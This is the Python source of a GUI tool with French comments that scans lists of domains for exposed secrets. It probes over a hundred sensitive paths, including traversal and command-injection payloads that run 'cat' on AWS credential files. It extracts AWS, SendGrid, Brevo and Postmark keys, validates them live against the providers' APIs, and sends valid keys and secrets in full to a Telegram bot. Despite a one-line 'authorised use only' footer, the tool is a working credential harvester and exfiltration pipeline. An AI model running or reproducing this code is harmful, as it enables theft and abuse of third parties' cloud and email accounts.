#!/usr/bin/env python3
"""
Scanner domaines + validation AWS / SendGrid / SMTP (GUI).
Usage: pip install requests boto3
Ne commitez JAMAIS de token Telegram en clair — utilisez les variables d'environnement
ou remplissez les champs dans l'interface.
"""

from __future__ import annotations

import html
import json
import os
import queue
import re
import ssl
import threading
import urllib.error
import urllib.parse
import urllib.request
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path
from tkinter import END, BOTH, LEFT, RIGHT, X, Y, W, filedialog, messagebox, scrolledtext, ttk
import tkinter as tk

# --- Dépendances optionnelles ---
try:
    import boto3
    from botocore.config import Config as BotoConfig
    from botocore.exceptions import ClientError

    HAS_BOTO = True
except ImportError:
    HAS_BOTO = False

try:
    import requests
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry

    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

# --- Collez vos identifiants Telegram ici (usage local uniquement, ne publiez pas ce fichier) ---
TELEGRAM_DEFAULT_BOT = ""
TELEGRAM_DEFAULT_CHAT = ""

# Chemins embarqués
PATHS_RAW = r"""
/_debug
/_profiler
/debug
/profiler
/phpdebugbar
/tracy
/whoops
/kint
/debug.php
/profiler.php
/phpinfo.php
/info.php
/php-info.php
/php_info.php
/test.php
/debug/test
/web/debug
/app_dev.php
/app_dev.php/_profiler
/web/app_dev.php
/.DS_Store
/web.config
/robots.txt
/.htaccess
/.env
/.aws/credentials
/aws.env
/backup.zip
/dump.sql
/backup.sql
/admin/config.php
/includes/config.php
/config/database.php
/application/config/database.php
/pms?module=logging&file_name=../../../../../../~/.aws/credentials&number_of_lines=10000
/admin/config?cmd=cat+/root/.aws/credentials
/cacti/cmd_realtime.php?1+1&&cat+~/.aws/credentials+1+1+1
/wp-config.php.bak
/appsettings.json
/config.json
/settings.py
/application.properties
/config.js
/.aws/config
/aws/credentials
/.AWS_/credentials
/.git/config
/.git/HEAD
/.git/index
/.git/logs/HEAD
/.git/COMMIT_EDITMSG
/wp-config.php
/wp-config.php.save
/wp-config.php.old
/server.js
/main.js
/index.js
/aws.yml
/config/aws.yml
/aws-secret.yaml
/phpinfo
/server-info.php
/server_info.php
/server-info
/admin/server_info.php
/static/js/main.js
/config/application.yml
/config/parameters.yml
/swagger.json
/swagger.js
/swagger.yaml
/.ssh/id_rsa
/.ssh/config
/id_rsa
/.netrc
/.htpasswd
/secrets.json
/secret.json
/credentials.json
/serviceAccountKey.json
/firebase-adminsdk.json
/google-cloud-keyfile.json
/.gcloud/credentials
/config/settings.json
/config/settings.local
/config/settings.prod
/.travis.yml
/.circleci/config.yml
/docker-compose.yml
/.dockerignore
/storage/logs/laravel.log
/error_log
/access.log
/debug.log
/config.local.yml
/config/local.yml
/backend/config/default.yml
/api/config/config.yml
/config/storage.yml
/application.yml
/s3.js
/server/s3.js
/configs/s3_config.json
/config/constants.js
/shared/config/config.js
/config/config.json
/admin/config
/config/parameters.yml.dist
"""

# Regex
RE_AWS_KEY = re.compile(r'["\']?AWS_ACCESS_KEY_ID["\']?\s*[:=]\s*["\']?([^"\'\s]{10,})["\']?', re.I)
RE_AWS_SECRET = re.compile(r'["\']?AWS_SECRET_ACCESS_KEY["\']?\s*[:=]\s*["\']?([^"\'\s]{10,})["\']?', re.I)
RE_AKIA = re.compile(r"\bAKIA[0-9A-Z]{16}\b")
RE_SG1 = re.compile(r"SENDGRID_API_KEY\s*[:=]\s*([^\s]+)")
RE_SG2 = re.compile(r"SG\.[0-9A-Za-z\-_]{22}\.[0-9A-Za-z\-_]{43}")
RE_BREVO = re.compile(r"xkeysib-[a-f0-9]{64}-[A-Za-z0-9]{6,16}", re.I)
RE_SMTP_HOST = re.compile(
    r"(?i)\b(?:smtp|mail|email|relay)\.[a-z0-9](?:[a-z0-9.-]*[a-z0-9])?\.(?:[a-z]{2,}|xn--[a-z0-9-]+)\b"
)
RE_POSTMARK = re.compile(
    r"(?i)POSTMARK(?:_SERVER)?_TOKEN\s*[=:]\s*['\"]?([a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12})"
)

AWS_STS_REGIONS = [
    "us-east-1",
    "us-east-2",
    "eu-west-1",
    "eu-central-1",
    "ap-southeast-1",
    "ap-northeast-1",
]


def load_paths() -> list[str]:
    seen: set[str] = set()
    out: list[str] = []
    for line in PATHS_RAW.splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        if not line.startswith("/"):
            line = "/" + line
        if "*" in line:
            line = line.replace("main.*.js", "main.js")
            if "*" in line:
                continue
        if line not in seen:
            seen.add(line)
            out.append(line)
    return out


def join_base_path(base: str, path: str) -> str:
    base = base.rstrip("/")
    if not path.startswith("/"):
        path = "/" + path
    u = urllib.parse.urlsplit(base)
    rel = urllib.parse.urlsplit(path)
    if rel.query:
        q = urllib.parse.parse_qsl(rel.query, keep_blank_values=True)
        new_query = urllib.parse.urlencode(q)
        return urllib.parse.urlunsplit((u.scheme, u.netloc, rel.path or path.split("?")[0], new_query, ""))
    return base + path


def http_get(url: str, timeout: float = 12.0) -> tuple[int | None, bytes]:
    if HAS_REQUESTS:
        try:
            r = requests.get(
                url,
                timeout=timeout,
                headers={"User-Agent": "Mozilla/5.0 (compatible; ScannerGUI/1.0)"},
                verify=False,
            )
            return r.status_code, r.content[:1_048_576]
        except Exception:
            return None, b""
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0 (compatible; ScannerGUI/1.0)"})
    try:
        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as resp:
            return resp.getcode(), resp.read(1_048_576)
    except Exception:
        return None, b""


def validate_sendgrid(key: str) -> tuple[bool, str]:
    if not HAS_REQUESTS:
        return False, "installez requests"
    try:
        r = requests.get(
            "https://api.sendgrid.com/v3/user/credits",
            headers={"Authorization": f"Bearer {key}", "Accept": "application/json"},
            timeout=15,
            verify=True,
        )
        if r.status_code != 200:
            return False, f"HTTP {r.status_code}"
        data = r.json()
        q = ", ".join(f"{k}={data.get(k)}" for k in ("remain", "total", "used") if k in data)
        return True, q or r.text[:300]
    except Exception as e:
        return False, str(e)


def validate_brevo(key: str) -> tuple[bool, str]:
    if not HAS_REQUESTS:
        return False, "installez requests"
    try:
        r = requests.get(
            "https://api.brevo.com/v3/account",
            headers={"api-key": key, "Accept": "application/json"},
            timeout=15,
            verify=True,
        )
        rem = r.headers.get("X-Sib-RateLimit-Remaining", "")
        if r.status_code != 200:
            return False, f"HTTP {r.status_code}"
        return True, f"rate_remaining={rem} {r.text[:400]}"
    except Exception as e:
        return False, str(e)


def validate_aws(access_key: str, secret_key: str) -> tuple[bool, str, str, str]:
    if not HAS_BOTO:
        return False, "", "", "installez boto3"
    last_err = ""
    for region in AWS_STS_REGIONS:
        try:
            client = boto3.client(
                "sts",
                aws_access_key_id=access_key,
                aws_secret_access_key=secret_key,
                region_name=region,
                config=BotoConfig(connect_timeout=8, read_timeout=8),
            )
            ident = client.get_caller_identity()
            arn = ident.get("Arn", "")
            acc = ident.get("Account", "")
            uid = ident.get("UserId", "")
            return True, region, arn, f"Account={acc} UserId={uid}"
        except ClientError as e:
            last_err = str(e)
        except Exception as e:
            last_err = str(e)
    return False, "", "", last_err


def send_telegram_html(bot_token: str, chat_id: str, text: str) -> None:
    if not bot_token or not chat_id:
        return
    url = f"https://api.telegram.org/bot{urllib.parse.quote(bot_token, safe=':/')}/sendMessage"
    data = urllib.parse.urlencode(
        {
            "chat_id": chat_id,
            "text": text[:4000],
            "parse_mode": "HTML",
            "disable_web_page_preview": "true",
        }
    ).encode()
    req = urllib.request.Request(url, data=data, method="POST", headers={"Content-Type": "application/x-www-form-urlencoded"})
    try:
        with urllib.request.urlopen(req, timeout=25) as r:
            r.read()
    except Exception:
        pass


def fmt_tg(title: str, lines: list[tuple[str, str]]) -> str:
    parts = [f"<b>{html.escape(title)}</b>"]
    for label, val in lines:
        parts.append(f"{label} <code>{html.escape(val[:3500])}</code>")
    return "\n".join(parts)


class ScannerApp(tk.Tk):
    def __init__(self) -> None:
        super().__init__()
        self.title("Scanner domaines — AWS · SendGrid · SMTP")
        self.geometry("920x640")
        self.minsize(800, 500)

        self.domains_path: str | None = None
        self.paths = load_paths()
        self._stop = threading.Event()
        self._log_q: queue.Queue[str] = queue.Queue()
        self._counters = {"aws": 0, "sg": 0, "smtp": 0}
        self._lock = threading.Lock()
        self._seen_notify: set[str] = set()
        self._counted: set[str] = set()

        # Style
        style = ttk.Style()
        if "clam" in style.theme_names():
            style.theme_use("clam")
        self.configure(bg="#1a1d23")
        fg = "#e8eaed"
        accent = "#5c9eff"

        outer = tk.Frame(self, bg="#1a1d23", padx=16, pady=14)
        outer.pack(fill=BOTH, expand=True)

        title = tk.Label(
            outer,
            text="🔍 Scanner de fuites (chemins + clés)",
            font=("Segoe UI", 16, "bold"),
            bg="#1a1d23",
            fg=fg,
        )
        title.pack(anchor=W, pady=(0, 4))
        sub = tk.Label(
            outer,
            text="Choisis un fichier texte (un domaine par ligne). Compteurs = hits validés uniquement.",
            font=("Segoe UI", 10),
            bg="#1a1d23",
            fg="#9aa0a6",
        )
        sub.pack(anchor=W, pady=(0, 12))

        # Telegram frame
        tg_frame = tk.LabelFrame(outer, text=" Telegram (webhook Bot API) ", bg="#252830", fg=fg, padx=10, pady=8)
        tg_frame.pack(fill=X, pady=(0, 10))

        tk.Label(tg_frame, text="Bot token:", bg="#252830", fg=fg).grid(row=0, column=0, sticky=W, padx=(0, 8))
        self.entry_token = tk.Entry(tg_frame, width=55, show="•", bg="#2d3139", fg=fg, insertbackground=fg)
        self.entry_token.grid(row=0, column=1, sticky=W, pady=2)

        tk.Label(tg_frame, text="Chat ID:", bg="#252830", fg=fg).grid(row=1, column=0, sticky=W, padx=(0, 8))
        self.entry_chat = tk.Entry(tg_frame, width=25, bg="#2d3139", fg=fg, insertbackground=fg)
        self.entry_chat.grid(row=1, column=1, sticky=W, pady=2)

        self.entry_token.insert(0, TELEGRAM_DEFAULT_BOT or os.environ.get("TELEGRAM_BOT_TOKEN", ""))
        self.entry_chat.insert(0, TELEGRAM_DEFAULT_CHAT or os.environ.get("TELEGRAM_CHAT_ID", ""))

        # File + buttons
        row = tk.Frame(outer, bg="#1a1d23")
        row.pack(fill=X, pady=(0, 10))

        self.btn_file = tk.Button(
            row,
            text="📂 Choisir liste de domaines",
            command=self.pick_file,
            bg="#3c4043",
            fg=fg,
            activebackground="#5f6368",
            padx=14,
            pady=8,
            cursor="hand2",
        )
        self.btn_file.pack(side=LEFT, padx=(0, 10))

        self.lbl_file = tk.Label(row, text="Aucun fichier", bg="#1a1d23", fg="#9aa0a6", font=("Segoe UI", 10))
        self.lbl_file.pack(side=LEFT)

        self.btn_start = tk.Button(
            row,
            text="▶ Lancer le scan",
            command=self.start_scan,
            bg=accent,
            fg="#0d1117",
            activebackground="#7eb6ff",
            font=("Segoe UI", 11, "bold"),
            padx=18,
            pady=8,
            cursor="hand2",
        )
        self.btn_start.pack(side=RIGHT)

        self.btn_stop = tk.Button(
            row,
            text="⏹ Arrêter",
            command=self.stop_scan,
            bg="#c5221f",
            fg="#fff",
            activebackground="#e53935",
            padx=12,
            pady=8,
            cursor="hand2",
            state=tk.DISABLED,
        )
        self.btn_stop.pack(side=RIGHT, padx=(0, 10))

        # Counters
        cf = tk.Frame(outer, bg="#252830", pady=10, padx=12)
        cf.pack(fill=X, pady=(0, 10))

        self.var_aws = tk.StringVar(value="0")
        self.var_sg = tk.StringVar(value="0")
        self.var_smtp = tk.StringVar(value="0")

        for i, (name, var, emoji) in enumerate(
            [("AWS (validé STS)", self.var_aws, "☁️"), ("SendGrid (API OK)", self.var_sg, "📧"), ("SMTP / mail (hôtes + Brevo…)", self.var_smtp, "📬")]
        ):
            f = tk.Frame(cf, bg="#252830")
            f.pack(side=LEFT, expand=True, fill=X, padx=20)
            tk.Label(f, text=f"{emoji} {name}", bg="#252830", fg="#9aa0a6", font=("Segoe UI", 9)).pack()
            tk.Label(f, textvariable=var, bg="#252830", fg=accent, font=("Segoe UI", 28, "bold")).pack()

        # Log
        log_frame = tk.LabelFrame(outer, text=" Journal ", bg="#1a1d23", fg=fg)
        log_frame.pack(fill=BOTH, expand=True)

        self.log = scrolledtext.ScrolledText(
            log_frame,
            height=18,
            bg="#0d1117",
            fg="#3fb950",
            insertbackground=fg,
            font=("Consolas", 9),
            relief=tk.FLAT,
            padx=8,
            pady=8,
        )
        self.log.pack(fill=BOTH, expand=True, padx=4, pady=4)

        foot = tk.Label(
            outer,
            text="pip install requests boto3  ·  Usage autorisé uniquement sur vos systèmes",
            bg="#1a1d23",
            fg="#5f6368",
            font=("Segoe UI", 8),
        )
        foot.pack(anchor=W, pady=(8, 0))

        self.after(120, self._drain_log_queue)

    def log_line(self, s: str) -> None:
        self._log_q.put(s)

    def _drain_log_queue(self) -> None:
        try:
            while True:
                s = self._log_q.get_nowait()
                self.log.insert(END, s + "\n")
                self.log.see(END)
        except queue.Empty:
            pass
        self.after(100, self._drain_log_queue)

    def bump(self, key: str) -> None:
        with self._lock:
            self._counters[key] = self._counters.get(key, 0) + 1
            if key == "aws":
                self.var_aws.set(str(self._counters["aws"]))
            elif key == "sg":
                self.var_sg.set(str(self._counters["sg"]))
            elif key == "smtp":
                self.var_smtp.set(str(self._counters["smtp"]))

    def bump_once(self, category: str, dedupe_id: str) -> bool:
        """Incrémente le compteur une seule fois par dedupe_id (ex: clé API)."""
        with self._lock:
            if dedupe_id in self._counted:
                return False
            self._counted.add(dedupe_id)
        self.bump(category)
        return True

    def pick_file(self) -> None:
        p = filedialog.askopenfilename(
            title="Liste de domaines",
            filetypes=[("Texte", "*.txt"), ("Tous les fichiers", "*.*")],
        )
        if p:
            self.domains_path = p
            self.lbl_file.config(text=Path(p).name, fg="#8ab4f8")

    def stop_scan(self) -> None:
        self._stop.set()

    def start_scan(self) -> None:
        if not self.domains_path or not Path(self.domains_path).is_file():
            messagebox.showwarning("Fichier", "Choisis d'abord un fichier de domaines.")
            return
        if not HAS_REQUESTS:
            messagebox.showerror("Dépendance", "Installez: pip install requests boto3")
            return
        self._stop.clear()
        self.btn_start.config(state=tk.DISABLED)
        self.btn_stop.config(state=tk.NORMAL)
        self.log.delete(1.0, END)
        with self._lock:
            self._counters = {"aws": 0, "sg": 0, "smtp": 0}
        self.var_aws.set("0")
        self.var_sg.set("0")
        self.var_smtp.set("0")
        self._seen_notify.clear()
        self._counted.clear()

        token = self.entry_token.get().strip()
        chat = self.entry_chat.get().strip()

        t = threading.Thread(target=self._run_scan, args=(token, chat), daemon=True)
        t.start()

    def _notify_once(self, key: str, body: str) -> None:
        with self._lock:
            if key in self._seen_notify:
                return
            self._seen_notify.add(key)
        bot = self.entry_token.get().strip()
        chat = self.entry_chat.get().strip()
        send_telegram_html(bot, chat, body)

    def _process_body(self, text: str, source_url: str, token: str, chat: str) -> None:
        # AWS pair
        km = RE_AWS_KEY.search(text)
        sm = RE_AWS_SECRET.search(text)
        if km and sm:
            ak, sk = km.group(1).strip(), sm.group(1).strip()
            if RE_AKIA.match(ak) and len(sk) >= 20:
                ok, region, arn, detail = validate_aws(ak, sk)
                if ok:
                    if self.bump_once("aws", f"aws:{ak}:{sk}"):
                        self.log_line(f"[VALID AWS] {source_url} region={region}")
                    msg = fmt_tg(
                        "☁️ AWS — clé VALIDÉE",
                        [
                            ("📍 Source:", source_url),
                            ("🌍 Région:", region),
                            ("🔑 Access key:", ak),
                            ("🔐 Secret:", sk),
                            ("📎 ARN:", arn),
                            ("ℹ️", detail),
                        ],
                    )
                    self._notify_once(f"aws:{ak}:{sk}", msg)

        # SendGrid
        sg_keys: set[str] = set()
        for m in RE_SG1.finditer(text):
            sg_keys.add(m.group(1).strip())
        sg_keys.update(RE_SG2.findall(text))
        for key in sg_keys:
            if len(key) < 10:
                continue
            ok, info = validate_sendgrid(key)
            if ok:
                if self.bump_once("sg", f"sg:{key}"):
                    self.log_line(f"[VALID SG] {source_url}")
                msg = fmt_tg(
                    "📧 SendGrid — VALIDÉ",
                    [("📍 Source:", source_url), ("🔑 Clé:", key), ("📊 Quota:", info)],
                )
                self._notify_once(f"sg:{key}", msg)

        # Brevo → compteur SMTP
        for key in set(RE_BREVO.findall(text)):
            ok, info = validate_brevo(key)
            if ok:
                if self.bump_once("smtp", f"brevo:{key}"):
                    self.log_line(f"[VALID Brevo] {source_url}")
                msg = fmt_tg(
                    "💙 Brevo — VALIDÉ",
                    [("📍 Source:", source_url), ("🔑 Clé:", key), ("📊", info)],
                )
                self._notify_once(f"brevo:{key}", msg)

        # Hôtes SMTP détectés (fuite de config)
        hosts = RE_SMTP_HOST.findall(text)
        if hosts:
            uniq = ", ".join(sorted(set(hosts))[:15])
            dedupe = "smtp_hosts:" + "|".join(sorted(set(hosts)))
            if self.bump_once("smtp", dedupe):
                self.log_line(f"[SMTP hosts] {source_url} ({len(set(hosts))} hôte(s))")
            msg = fmt_tg(
                "📬 Config SMTP (hôtes détectés)",
                [("📍 Source:", source_url), ("🌐 Hôtes:", uniq)],
            )
            self._notify_once(f"smtp_hosts:{source_url}:{dedupe}", msg)

        # Postmark token pattern
        for tok in set(RE_POSTMARK.findall(text)):
            if self.bump_once("smtp", f"pm:{tok}"):
                self.log_line(f"[Postmark token pattern] {source_url}")
            msg = fmt_tg("📮 Postmark (motif token)", [("📍 Source:", source_url), ("Token:", tok)])
            self._notify_once(f"pm:{tok}", msg)

    def _scan_domain(self, domain: str, token: str, chat: str) -> None:
        domain = domain.strip()
        if not domain or self._stop.is_set():
            return
        if "://" not in domain:
            bases = [f"https://{domain}", f"http://{domain}"]
        else:
            bases = [domain]

        max_workers = min(32, max(4, len(self.paths) // 4 + 1))

        def fetch_one(args: tuple[str, str]) -> tuple[str, str, bytes | None]:
            base, path = args
            url = join_base_path(base, path)
            code, body = http_get(url)
            if code and 200 <= code < 300 and body:
                return url, path, body
            return url, path, None

        tasks = [(b, p) for b in bases for p in self.paths]
        with ThreadPoolExecutor(max_workers=max_workers) as ex:
            futs = [ex.submit(fetch_one, t) for t in tasks]
            for fut in as_completed(futs):
                if self._stop.is_set():
                    break
                url, path, body = fut.result()
                if body:
                    try:
                        text = body.decode("utf-8", errors="replace")
                    except Exception:
                        continue
                    self._process_body(text, url, token, chat)

    def _run_scan(self, token: str, chat: str) -> None:
        try:
            path = self.domains_path
            assert path
            lines = Path(path).read_text(encoding="utf-8", errors="replace").splitlines()
            self.log_line(f"[*] {len(lines)} domaine(s), {len(self.paths)} chemins / domaine")
            if not HAS_BOTO:
                self.log_line("[!] boto3 absent — validation AWS désactivée (pip install boto3)")

            for i, line in enumerate(lines):
                if self._stop.is_set():
                    self.log_line("[*] Arrêt demandé.")
                    break
                d = line.strip()
                if not d or d.startswith("#"):
                    continue
                self.log_line(f"--- [{i + 1}/{len(lines)}] {d} ---")
                self._scan_domain(d, token, chat)

            self.log_line("[+] Scan terminé.")
        except Exception as e:
            self.log_line(f"[!] Erreur: {e}")
        finally:
            self.after(0, lambda: self.btn_start.config(state=tk.NORMAL))
            self.after(0, lambda: self.btn_stop.config(state=tk.DISABLED))


def main() -> None:
    import warnings

    warnings.filterwarnings("ignore", category=DeprecationWarning)
    if HAS_REQUESTS:
        import urllib3

        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    app = ScannerApp()
    app.mainloop()


if __name__ == "__main__":
    main()
